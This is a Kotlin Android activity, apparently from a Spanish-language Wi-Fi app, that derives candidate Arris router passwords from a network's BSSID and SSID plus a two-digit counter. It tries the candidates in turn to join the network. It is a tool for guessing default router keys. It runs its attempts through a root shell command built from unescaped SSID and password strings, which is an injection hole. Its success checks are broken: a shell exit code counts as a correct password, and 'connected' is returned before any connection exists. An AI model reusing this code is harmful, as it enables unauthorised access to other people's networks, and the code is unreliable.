package com.example.wi_fi.ui.theme

import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.net.wifi.WifiConfiguration
import android.net.wifi.WifiNetworkSpecifier
import android.os.Build
import android.os.Bundle
import android.widget.ImageButton
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import com.example.wi_fi.R
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext

class arrisWifiDetailsActivity : AppCompatActivity() {
    protected lateinit var ssid: String
    protected lateinit var bssid: String
    protected lateinit var lastPassword: String

    private val TAG = "WifiUtils"

    @RequiresApi(Build.VERSION_CODES.Q)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.arris_activity_wifi_details)

        val ssidTextView: TextView = findViewById(R.id.arrisssidTextView)
        val passwordTextView: TextView = findViewById(R.id.arrispasswordTextView)

        val intent = intent
        if (intent != null) {
            ssid = intent.getStringExtra("SSID") ?: ""
            bssid = intent.getStringExtra("BSSID") ?: ""
            lastPassword = intent.getStringExtra("PASSWORD") ?: ""

            ssidTextView.text = "NOMBRE (SSID): $ssid"
            passwordTextView.text = "CONTRASEÑA: $lastPassword"
        }

        val ssidLayout: LinearLayout = findViewById(R.id.ssidLayout)
        val passwordLayout: LinearLayout = findViewById(R.id.passwordLayout)
        val connectButton: ImageButton = findViewById(R.id.connectButton)

        ssidLayout.setOnClickListener {
            copyToClipboard(ssidTextView.text.toString(), "SSID")
        }

        passwordLayout.setOnClickListener {
            copyToClipboard(passwordTextView.text.toString(), "Contraseña")
        }

        connectButton.setOnClickListener {
            tryPasswordsInBackground()
        }

        val backButton: ImageButton = findViewById(R.id.arrisbackButton)
        backButton.setOnClickListener {
            finish()
        }
    }

    private fun copyToClipboard(text: String, label: String) {
        val clipboard = getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
        val cleanedText = text.substringAfter(": ").trim()
        val clip = android.content.ClipData.newPlainText("Copied Text", cleanedText)
        clipboard.setPrimaryClip(clip)
        Toast.makeText(this, "$label copiado", Toast.LENGTH_SHORT).show()
    }

    @RequiresApi(Build.VERSION_CODES.Q)
    protected fun tryPasswordsInBackground() {
        GlobalScope.launch(Dispatchers.IO) {
            var isConnected = false
            for (i in 99 downTo 0) {
                val password = String.format("%02d", i)
                val generatedPassword = getPassword(bssid, ssid, password)
                val result = tryPassword(generatedPassword)
                if (result == 0) {
                    // La contraseña es correcta, intenta conectarse
                    isConnected = connectToWifi(ssid, generatedPassword)
                    if (isConnected) {
                        // Conexión exitosa
                        withContext(Dispatchers.Main) {
                            // Muestra un mensaje de conexión exitosa y la contraseña
                            Toast.makeText(this@arrisWifiDetailsActivity, "Conexión exitosa", Toast.LENGTH_SHORT).show()
                            Toast.makeText(this@arrisWifiDetailsActivity, "Contraseña: $generatedPassword", Toast.LENGTH_SHORT).show()
                        }
                        break
                    }
                } else if (i == 99) {
                    // Muestra un Toast con la primera contraseña que se intentará
                    withContext(Dispatchers.Main) {
                        Toast.makeText(this@arrisWifiDetailsActivity, "Intentando contraseña: $generatedPassword", Toast.LENGTH_SHORT).show()
                    }
                }
            }

            // Se han probado todas las contraseñas de la lista y no se ha conectado
            if (!isConnected) {
                // Manejar el caso según sea necesario
            }
        }
    }

    protected fun tryPassword(password: String): Int {
        val packageName = "com.example.wi_fi"
        val serviceName = "Arris_tracker_service"

        val command = "am startservice -n $packageName/$serviceName --es ssid \"$ssid\" --es password \"$password\""

        try {
            val process = Runtime.getRuntime().exec(arrayOf("su", "-c", command))
            return process.waitFor()
        } catch (e: Exception) {
            e.printStackTrace()
            // Manejar excepciones aquí
            return -1
        }
    }

    @RequiresApi(Build.VERSION_CODES.Q)
    protected fun connectToWifi(ssid: String, password: String): Boolean {
        val specifier = WifiNetworkSpecifier.Builder()
            .setSsid(ssid)
            .setWpa2Passphrase(password)
            .build()

        val request = NetworkRequest.Builder()
            .addTransportType(NetworkCapabilities.TRANSPORT_WIFI)
            .setNetworkSpecifier(specifier)
            .build()

        val connectivityManager =
            getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val callback = object : ConnectivityManager.NetworkCallback() {
            override fun onAvailable(network: Network) {
                super.onAvailable(network)
                // Acciones cuando se establece la conexión exitosamente
            }

            override fun onUnavailable() {
                super.onUnavailable()
                // Acciones cuando la conexión no está disponible
            }
        }

        try {
            connectivityManager.requestNetwork(request, callback)
            // La conexión se establecerá de forma asíncrona, y las acciones se manejarán en el callback
            return true
        } catch (e: Exception) {
            e.printStackTrace()
            // Manejar excepciones aquí
            return false
        }
    }

    protected fun getPassword(bssid: String, ssid: String, password: String): String {
        val bssidDigits = bssid.replace(":", "").substring(0, 6).toUpperCase()
        val ssidDigits = ssid.replace("-", "").replace(".", "").substring(5, 9).toUpperCase()
        return "$bssidDigits$password$ssidDigits"
    }
}
